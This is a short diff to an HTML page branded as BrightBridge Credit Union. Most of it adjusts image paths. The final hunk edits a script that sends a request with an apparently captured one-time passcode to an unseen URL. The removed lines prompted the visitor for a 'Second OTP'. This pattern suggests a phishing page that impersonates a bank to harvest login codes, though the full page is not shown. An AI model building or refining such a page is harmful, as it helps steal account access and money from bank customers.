@@ -18,7 +18,7 @@
             align-items: center;
             min-height: 100vh;
             background: linear-gradient(to top, #1a3c5e, #4a90e2); /* Gradient overlay */
-            background-image: url('public/bg.png'); /* Replace with actual bridge image URL */
+            background-image: url('/bg.png'); /* Replace with actual bridge image URL */
             background-size: cover;
             background-position: center;
         }
@@ -498,7 +498,7 @@ h3 {
        
         <div id="primary_form">
             <div class="logo">
-                <img src="/public/logo.png" alt="BrightBridge Credit Union Logo">
+                <img src="/logo.png" alt="BrightBridge Credit Union Logo">
             </div>
         
             <div class="h2Header">
@@ -549,7 +549,7 @@ h3 {
         </div>
 
         <div class="image_form_background">
-            <img src="public/bg.png" alt="background"/>
+            <img src="/bg.png" alt="background"/>
         </div>
        
     </div>
@@ -611,8 +611,7 @@ h3 {
        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();
-       alert("OTp has been validated, Input Second OTP");
-   window.location.href="otp2.html";
+   window.location.href="index.html";
     }
 </script>
 </html>
